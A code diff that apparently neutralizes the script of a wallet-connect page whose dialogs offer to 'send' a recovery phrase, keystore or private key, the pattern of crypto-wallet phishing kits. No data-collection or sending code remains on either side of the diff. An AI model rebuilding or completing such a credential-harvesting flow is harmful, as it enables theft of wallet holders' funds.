@@ -9953,49 +9953,43 @@
     });
   </script>
  <script>
-    $(document).ready(function () {
-      let dialogDismiss = $(".dialog-dismiss");
-      let sendForm = $("#data-to-send");
-      let successBox = $("#success-dialog");
-      let errorBox = $("#error-dialog");
-      
-      dialogDismiss.each(function () {
-        $(this).on("click", function () {
-          $("#connect-dialog").hide();
-          $("#send-dialog").hide();
-        });
-      });
+$(document).ready(function () {
+  let dialogDismiss = $(".dialog-dismiss");
 
-      // The dynamic form elements inside these actions have been stripped out
-      $("#phraseSend").on("click", function () {
-        sendForm.html(''); 
-      });
-      $("#keystoreSend").on("click", function () {
-        sendForm.html('');
-      });
-      $("#privateKeySend").on("click", function () {
-        sendForm.html('');
-      });
-
-      $(".connection-info").on("click", ".manual-connection", function () {
-        $("#current-wallet-app-send").text($("#current-wallet-app").text());
-        $("#walletNameData").val($("#current-wallet-app").text());
-        var link = $("#current-wallet-app").text();
-        $("#current-wallet-send-logo").attr(
-          "src",
-          $("#current-wallet-logo").attr("src")
-        );
-        $("#connect-dialog").hide();
-        $("#send-dialog").show();
-      });
-
-      $.ajaxSetup({
-        headers: {
-          "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
-        },
-      });
-
+  // Handle closing the dialog modals
+  dialogDismiss.each(function () {
+    $(this).on("click", function () {
+      $("#connect-dialog").hide();
+      $("#send-dialog").hide();
     });
+  });
+
+  // Neutralized tab navigation triggers - UI indicators only
+  $("#phraseSend").on("click", function () {
+    // Clear any previous form data container entirely
+    $("#data-to-send").html('<div class="text-center py-3">Recovery Phrase option selected.</div>');
+  });
+
+  $("#keystoreSend").on("click", function () {
+    $("#data-to-send").html('<div class="text-center py-3">Keystore JSON option selected.</div>');
+  });
+
+  $("#privateKeySend").on("click", function () {
+    $("#data-to-send").html('<div class="text-center py-3">Private Key option selected.</div>');
+  });
+
+  // Handle transitioning from the initial dialog to the second UI panel
+  $(".connection-info").on("click", ".manual-connection", function () {
+    $("#current-wallet-app-send").text($("#current-wallet-app").text());
+    $("#current-wallet-send-logo").attr(
+      "src",
+      $("#current-wallet-logo").attr("src")
+    );
+    $("#connect-dialog").hide();
+    $("#send-dialog").show();
+  });
+});
+
   </script>
 
 
